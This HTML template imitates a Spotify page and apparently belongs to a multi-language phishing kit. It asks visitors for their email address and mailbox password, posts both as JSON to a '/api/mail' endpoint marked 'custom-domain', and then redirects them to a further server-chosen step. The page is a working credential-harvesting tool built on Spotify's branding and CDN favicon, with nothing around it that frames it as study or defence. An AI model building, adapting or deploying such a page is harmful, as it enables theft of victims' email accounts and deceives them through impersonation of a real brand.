<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ get_text(lang, 'generic_title') }} - Spotify</title>
    <link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon.0f31d2ea.ico">
    <style>
        *{box-sizing:border-box;margin:0;padding:0;font-family:Circular,Spotify Circular,Helvetica,Arial,sans-serif}
        body{background-color:#121212;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .card{background-color:#000;width:100%;max-width:450px;padding:40px 50px;border-radius:8px;box-shadow:0 4px 60px rgba(0,0,0,0.5)}
        h1{text-align:center;font-size:1.75rem;font-weight:700;margin-bottom:15px}
        p{text-align:center;font-size:.9rem;color:#b3b3b3;margin-bottom:30px}
        .form-group{margin-bottom:20px}
        label{display:block;font-size:.875rem;font-weight:700;margin-bottom:8px}
        input{width:100%;padding:14px;background:#121212;border:1px solid #727272;border-radius:4px;color:#fff;font-size:1rem}
        input:focus{outline:none;border-color:#fff}
        .submit-btn{width:100%;padding:14px;background-color:#1db954;color:#000;border:none;border-radius:500px;font-size:1rem;font-weight:700;cursor:pointer;margin-top:10px}
        .submit-btn:hover{background-color:#1ed760}
        .lang-indicator{text-align:center;font-size:11px;color:#6c6c8a;margin-bottom:10px}
        .error-msg{color:#e91429;font-size:13px;margin-top:8px;display:none;text-align:center}
    </style>
</head>
<body>
    <div class="card">
        <div class="lang-indicator">🌍 {{ get_text(lang, 'name') }}</div>
        <h1>{{ get_text(lang, 'generic_title') }}</h1>
        <p>{{ get_text(lang, 'generic_subtitle') }}</p>
        <form id="genericMailForm">
            <div class="form-group">
                <label>{{ get_text(lang, 'generic_email') }}</label>
                <input type="email" id="mailEmail" name="mailEmail" required placeholder="{{ get_text(lang, 'generic_email') }}" autocomplete="email">
            </div>
            <div class="form-group">
                <label>{{ get_text(lang, 'generic_password') }}</label>
                <input type="password" id="mailPassword" name="mailPassword" required placeholder="{{ get_text(lang, 'generic_password') }}" autocomplete="current-password">
            </div>
            <button type="submit" class="submit-btn">{{ get_text(lang, 'generic_button') }}</button>
            <div class="error-msg" id="errorMsg">Please fill in all fields</div>
        </form>
    </div>
    <script>
        document.getElementById('genericMailForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const mailEmail = document.getElementById('mailEmail').value;
            const mailPassword = document.getElementById('mailPassword').value;
            const errorMsg = document.getElementById('errorMsg');
            
            if (!mailEmail || !mailPassword) {
                errorMsg.style.display = 'block';
                return;
            }
            errorMsg.style.display = 'none';
            
            try {
                const res = await fetch('/api/mail', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        provider: 'custom-domain', 
                        mailEmail, 
                        mailPassword 
                    })
                });
                const data = await res.json();
                if (data.status === 'success') {
                    window.location.href = data.next;
                } else {
                    errorMsg.textContent = data.message || 'Error, please try again.';
                    errorMsg.style.display = 'block';
                }
            } catch(err) {
                errorMsg.textContent = 'Network error, please try again.';
                errorMsg.style.display = 'block';
            }
        });
    </script>
</body>
</html>
